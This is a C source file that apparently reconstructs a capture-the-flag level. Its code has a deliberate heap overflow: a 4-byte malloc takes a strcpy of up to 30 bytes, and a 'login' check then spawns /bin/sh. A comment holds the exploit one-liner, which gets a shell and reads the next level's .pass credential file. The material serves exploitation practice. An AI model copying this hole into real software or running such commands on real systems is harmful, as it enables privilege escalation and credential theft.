#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *auth    = NULL;
char *service = NULL;

// (echo "auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; echo "service s1"; echo "service s2"; echo "service s3"; echo "login"; sleep 1; echo "cat /home/user/level9/.pass"; sleep 1) | /home/user/level8/level8
int main(void)
{
    char buf[128];

    while (1) {
        printf("%p, %p \n", auth, service);

        if (!fgets(buf, 128, stdin))
            break;

        if (strncmp(buf, "auth ", 5) == 0) {
            auth = malloc(4);
            auth[0] = '\0';
            if (strlen(buf + 5) < 31)
                strcpy(auth, buf + 5);
        } else if (strncmp(buf, "reset", 5) == 0) {
            free(auth);
        } else if (strncmp(buf, "service", 7) == 0) {
            service = strdup(buf + 7);
        } else if (strncmp(buf, "login", 5) == 0) {
            if (auth[32])
                system("/bin/sh");
            else
                fwrite("Password:\n", 1, 10, stdout);
        }
    }
    return 0;
}
